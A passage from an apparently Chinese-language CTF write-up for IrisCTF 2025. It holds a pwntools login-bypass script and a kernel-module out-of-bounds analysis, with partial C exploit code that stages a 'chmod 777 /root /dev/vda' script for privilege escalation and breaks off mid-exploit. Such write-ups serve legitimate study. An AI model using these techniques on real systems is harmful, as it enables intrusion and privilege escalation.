<span class="n">lss</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">ls</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s -&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">x</span><span class="p">)))</span>

<span class="n">attack</span> <span class="o">=</span> <span class="sh">'</span><span class="s">sqlate.chal.irisc.tf:10000</span><span class="sh">'</span>
<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./vuln</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span><span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REM</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">attack</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="nf">context</span><span class="p">(</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">,</span>
<span class="n">terminal</span><span class="o">=</span><span class="sh">'</span><span class="s">tmux splitw -h -l 170</span><span class="sh">'</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">))</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span><span class="p">.</span><span class="n">libc</span>
<span class="c1">#elf  = ELF(binary)
#print(context.binary.libs)
#libc = ELF('./libc.so.6')
</span>
<span class="c1">#import socks
#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)
</span>
<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
b *action_login
#continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">([])</span>


<span class="c1">#gdb.attach(io,gdbscript)`Y
</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">5</span><span class="sh">'</span><span class="p">)</span>

<span class="c1">#pause()
</span><span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="se">\x00\x00</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># 绕过登录
</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">7</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># cat flag
</span>


<span class="c1">#pay = flat({
#},filler=b'\x00')
</span>
<span class="nf">itr</span><span class="p">()</span>

</pre></td></tr></tbody></table></code></div></div>

<h2 id="checksumz"><span class="me-2">checksumz</span><a href="#checksumz" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="分析"><span class="me-2">分析</span><a href="#分析" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<blockquote>
  <p>解决这道题的过程中我学到了很多东西</p>
</blockquote>

<p>‍</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>modinfo ./artifacts/vuln.ko 
filename:       /opt/kernel_chall/2025-irisctf-Checksumz/./artifacts/vuln.ko
license:        GPL
author:         LambdaXCF &lt;hello@lambda.blog&gt;
description:    /dev/checksumz: a vulnerable kernel module
depends:    
retpoline:      Y
name:           vuln
vermagic:       6.10.10 SMP preempt mod_unload
</pre></td></tr></tbody></table></code></div></div>
<p>这个kernel 驱动大概有 4 个主要的调用</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="n">lseek</span>
<span class="n">write</span>
<span class="n">read</span>
<span class="n">ioctl</span>
</pre></td></tr></tbody></table></code></div></div>

<p>虽然是 <code class="language-plaintext highlighter-rouge">iter</code>​ 但是也可以通过 read 和 write 调用​​</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="n">struct_name</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">owner fop_flags llseek read write read_iter write_iter iopoll iterate_shared poll unlocked_ioctl compat_ioctl mmap open flush release fsync fasync lock get_unmapped_area check_flags flock splice_write splice_read splice_eof setlease fallocate show_fdinfo mmap_capabilities copy_file_range remap_file_range fadvise uring_cmd uring_cmd_iopoll</span><span class="sh">'''</span>
<span class="n">struct_name</span> <span class="o">=</span> <span class="n">struct_name</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">)</span>

<span class="n">fops_address</span> <span class="o">=</span> <span class="mh">0x600</span>
<span class="n">ida_name</span><span class="p">.</span><span class="nf">set_name</span><span class="p">(</span><span class="n">fops_address</span><span class="p">,</span> <span class="sh">'</span><span class="s">fops</span><span class="sh">'</span><span class="p">)</span>
<span class="k">for</span> <span class="n">offset</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">struct_name</span><span class="p">)):</span>
    <span class="n">next_ptr</span> <span class="o">=</span> <span class="n">ida_bytes</span><span class="p">.</span><span class="nf">get_qword</span><span class="p">(</span><span class="n">fops_address</span> <span class="o">+</span> <span class="n">offset</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
    <span class="nf">if</span><span class="p">(</span><span class="n">next_ptr</span><span class="p">):</span>
        <span class="n">sname</span> <span class="o">=</span> <span class="sh">'</span><span class="s">device_</span><span class="sh">'</span> <span class="o">+</span> <span class="n">struct_name</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span>
        <span class="n">ida_name</span><span class="p">.</span><span class="nf">set_name</span><span class="p">(</span><span class="n">next_ptr</span><span class="p">,</span> <span class="n">sname</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">next_ptr</span><span class="p">),</span><span class="sh">'</span><span class="s"> --&gt; </span><span class="sh">'</span><span class="p">,</span><span class="n">sname</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107133331-fnyg2ky.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107133331-fnyg2ky.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>驱动程序checksum_buffer结构体</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="k">struct</span> <span class="n">checksum_buffer</span> <span class="p">{</span>
    <span class="n">loff_t</span> <span class="n">pos</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">state</span><span class="p">[</span><span class="mh">0x200</span><span class="p">];</span>
    <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">read</span><span class="p">;</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">name</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">digest</span><span class="p">;</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>checksum 几个函数</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
</pre></td><td class="rouge-code"><pre>
<span class="c1">// 初始化 checksum_buffer 结构体</span>
<span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">device_flush</span><span class="p">(</span><span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">checksum_buf</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="n">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// rdi</span>
  <span class="n">checksum_buf</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// rbx</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">v5</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// rdx</span>

  <span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="n">checksum_buf</span> <span class="o">*</span><span class="p">)</span><span class="n">kmalloc_trace_noprof</span><span class="p">(</span><span class="n">kmalloc_caches</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="mh">0xDC0LL</span><span class="p">,</span> <span class="mh">0x228LL</span><span class="p">);</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="n">kmalloc_caches</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
  <span class="n">file</span><span class="o">-&gt;</span><span class="n">private_data</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
  <span class="n">v2</span><span class="o">-&gt;</span><span class="n">pos</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">v2</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="mh">0x200LL</span><span class="p">;</span>
  <span class="n">v2</span><span class="o">-&gt;</span><span class="n">read</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">kmalloc_trace_noprof</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="mh">0xDC0LL</span><span class="p">,</span> <span class="mh">0x3E8LL</span><span class="p">);</span>
  <span class="n">size</span> <span class="o">=</span> <span class="n">v4</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v4</span><span class="o">-&gt;</span><span class="n">digest</span> <span class="o">=</span> <span class="mi">1LL</span><span class="p">;</span>
  <span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v5</span> <span class="o">=</span> <span class="mh">0x746C7561666564LL</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="p">)</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">v4</span><span class="o">-&gt;</span><span class="n">state</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
<span class="p">}</span>                                               <span class="c1">// init</span>


<span class="kt">ssize_t</span> <span class="nf">device_llseek</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">user_buffer</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">length</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">offset</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">checksum_buf</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// rcx</span>
  <span class="kt">ssize_t</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// rdx</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// rsi</span>

  <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="n">checksum_buf</span> <span class="o">*</span><span class="p">)</span><span class="n">file</span><span class="p">[</span><span class="mh">0x19</span><span class="p">];</span>
	<span class="p">......</span>
  <span class="k">else</span>
  <span class="p">{</span>
	<span class="p">....</span>
    <span class="n">v4</span><span class="o">-&gt;</span><span class="n">pos</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span><span class="n">user_buffer</span><span class="p">;</span>            <span class="c1">// 直接设置 pos 的值</span>
    <span class="n">size</span> <span class="o">=</span> <span class="n">v4</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">user_buffer</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">v7</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
  <span class="p">...</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="o">&gt;=</span> <span class="n">size</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">v4</span><span class="o">-&gt;</span><span class="n">pos</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span> <span class="n">pos</span><span class="err">最大</span> <span class="err">只能为</span> <span class="mh">0x1FF</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">device_write_iter</span><span class="p">(</span><span class="n">kiocb</span> <span class="o">*</span><span class="n">iocb</span><span class="p">,</span> <span class="n">iov_iter</span> <span class="o">*</span><span class="n">from</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">__kernel_size_t</span> <span class="n">iov_len</span><span class="p">;</span> <span class="c1">// rsi</span>
  <span class="n">checksum_buf</span> <span class="o">*</span><span class="n">private_data</span><span class="p">;</span> <span class="c1">// rbx</span>
  <span class="kt">ssize_t</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="n">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="n">__int64</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// rbp</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">PTR</span><span class="p">;</span> <span class="c1">// r13</span>
  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// rsi</span>
  <span class="kt">size_t</span> <span class="o">*</span><span class="n">v10</span><span class="p">;</span> <span class="c1">// rdx</span>

  <span class="n">iov_len</span> <span class="o">=</span> <span class="n">from</span><span class="o">-&gt;</span><span class="n">__ubuf_iovec</span><span class="p">.</span><span class="n">iov_len</span><span class="p">;</span>
  <span class="n">private_data</span> <span class="o">=</span> <span class="p">(</span><span class="n">checksum_buf</span> <span class="o">*</span><span class="p">)</span><span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_filp</span><span class="o">-&gt;</span><span class="n">private_data</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">private_data</span> <span class="p">)</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">77LL</span><span class="p">;</span>
  <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">iov_len</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v6</span> <span class="o">=</span> <span class="mh">0x10LL</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">iov_len</span> <span class="o">&lt;=</span> <span class="mh">0x10</span> <span class="p">)</span>                      <span class="c1">// 最大是 0x10 legnth</span>
      <span class="n">v6</span> <span class="o">=</span> <span class="n">iov_len</span><span class="p">;</span>
    <span class="n">v7</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span>
    <span class="n">PTR</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">private_data</span><span class="o">-&gt;</span><span class="n">state</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)</span><span class="n">private_data</span><span class="o">-&gt;</span><span class="n">pos</span><span class="p">];</span> <span class="c1">// 漏洞点</span>
    <span class="p">......</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">copy_from_iter</span><span class="p">(</span><span class="n">PTR</span><span class="p">,</span> <span class="n">v7</span><span class="p">,</span> <span class="n">from</span><span class="p">);</span> 
    <span class="p">......</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="k">struct</span> <span class="n">checksum_buffer</span> <span class="p">{</span>
    <span class="n">loff_t</span> <span class="n">pos</span><span class="p">;</span>  <span class="c1">// 是 0x1ff</span>
    <span class="kt">char</span> <span class="n">state</span><span class="p">[</span><span class="mh">0x200</span><span class="p">];</span>
    <span class="kt">size_t</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x200</span><span class="p">;</span> <span class="c1">// MAX Size - 1</span>
    <span class="kt">size_t</span> <span class="n">read</span><span class="p">;</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">name</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">digest</span><span class="p">;</span>
<span class="p">};</span>

<span class="n">PTR</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">private_data</span><span class="o">-&gt;</span><span class="n">state</span><span class="p">[</span><span class="mh">0x1ff</span><span class="p">];</span>
<span class="n">copy_from_iter</span><span class="p">(</span><span class="n">PTR</span><span class="p">,</span> <span class="n">v7</span><span class="p">,</span> <span class="n">from</span><span class="p">);</span> <span class="n">copy</span> <span class="mh">0x10</span><span class="err">个字节，可以把</span> <span class="n">checksum_buffer</span><span class="o">-&gt;</span><span class="n">size</span> <span class="err">覆盖，后面由于没有</span> <span class="n">size</span><span class="err">的现在，可以</span> <span class="err">直接</span> <span class="n">set</span> <span class="n">pos</span> <span class="err">任意大小</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<code class="language-plaintext highlighter-rouge">0xfffffe00000002e4</code>​ 在kernel是固定的一个地址，里面有 vmlinux 的地址，可以把 name 指针覆盖成 它，然后再查看name 泄露出来，从而泄露 vmlinux kernel 的地址</p>

<h3 id="exploit"><span class="me-2">exploit</span><a href="#exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">"api.h"</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/uio.h&gt;</span><span class="c1"> //  struct iovec</span><span class="cp">
</span>
<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>

<span class="cm">/*----------ioctl----------*/</span>
<span class="kt">void</span> <span class="nf">set_name</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0xC0084000</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">show_digest</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0xC0084003</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">set_size</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">){</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0xC0044002</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">check</span><span class="p">(){</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x4001</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/*----------llseek----------*/</span>
<span class="n">add_pos</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">){</span>
    <span class="n">syscall</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">sub_pos</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">){</span>
    <span class="n">syscall</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">set_pos</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">){</span>
    <span class="n">syscall</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/*----------write----------*/</span>

<span class="n">write_iter</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">){</span>
    <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">read_iter</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">){</span>
    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>


    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '#!/bin/sh</span><span class="se">\n</span><span class="s">/bin/chmod 777 /root /dev/vda</span><span class="se">\n</span><span class="s">' &gt; /tmp/e1"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /tmp/e1"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff' &gt; /tmp/e2"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /tmp/e2"</span><span class="p">);</span>

    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/checksumz"</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

    <span class="kt">size_t</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x1000</span><span class="o">/</span><span class="mi">8</span><span class="p">];</span>

    <span class="n">set_pos</span><span class="p">(</span><span class="mh">0x200</span><span class="p">);</span>

    <span class="c1">//read_iter(buf, 0);</span>
    <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFFFFF</span><span class="p">;</span>
    <span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFFFFF</span><span class="p">;</span>

    <span class="n">write_iter</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>

    <span class="n">set_pos</span><span class="p">(</span><span class="mh">0x210</span><span class="p">);</span>
    <span class="n">read_iter</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>

    <span class="kt">size_t</span> <span class="n">heap_addr</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"heap_addr = %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">heap_addr</span><span class="p">);</span>


    <span class="kt">size_t</span> <span class="n">kernel_in</span> <span class="o">=</span> <span class="mh">0xfffffe00000002e4</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">-</span> <span class="n">kernel_in</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"offset = %p</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>


    <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFFFFFFFF</span><span class="p">;</span>
    <span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFFFFFFFF</span><span class="p">;</span>
    <span class="n">set_pos</span><span class="p">(</span><span class="mh">0x200</span><span class="p">);</span>
